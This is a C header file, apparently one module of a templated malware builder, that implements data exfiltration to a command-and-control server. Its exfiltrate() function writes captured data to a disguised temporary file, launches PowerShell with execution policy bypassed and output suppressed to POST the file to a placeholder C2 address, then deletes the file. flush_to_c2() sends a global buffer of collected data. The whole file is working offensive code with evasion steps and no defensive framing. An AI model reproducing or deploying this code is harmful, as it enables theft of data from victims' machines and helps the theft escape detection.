// chunk: exfil/powershell_lolbin
// depends: core/emit_buffer, core/run_cmd
// provides: exfiltrate, flush_to_c2
// note: LOLBin exfil via powershell Invoke-WebRequest — HTTP POST

#ifndef CHUNK_POWERSHELL_LOLBIN
#define CHUNK_POWERSHELL_LOLBIN

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

static BOOL exfiltrate(const char *ip, int port, const char *data, DWORD len) {
    if (!data || len == 0) return FALSE;
    char temp_dir[MAX_PATH], temp_file[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_dir);
    snprintf(temp_file, MAX_PATH, "%s~diag_%lx.tmp", temp_dir, GetTickCount());

    HANDLE hf = CreateFileA(temp_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hf == INVALID_HANDLE_VALUE) return FALSE;
    DWORD written;
    WriteFile(hf, data, len, &written, NULL);
    CloseHandle(hf);
    if (written != len) { DeleteFileA(temp_file); return FALSE; }

    char cmd[2048];
    snprintf(cmd, sizeof(cmd),
             "cmd /c powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "
             "\"Invoke-WebRequest -Uri 'http://%s:%d/' -Method POST "
             "-InFile '%s' -UseBasicParsing\" >nul 2>&1",
             ip, port, temp_file);
    char out[256] = {0}; DWORD out_len = 0;
    run_cmd(cmd, out, sizeof(out), &out_len);

    DeleteFileA(temp_file);
    return TRUE;
}

static void flush_to_c2(void) {
    if (g_pos > 0) {
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);
        g_pos = 0;
    }
}

#endif
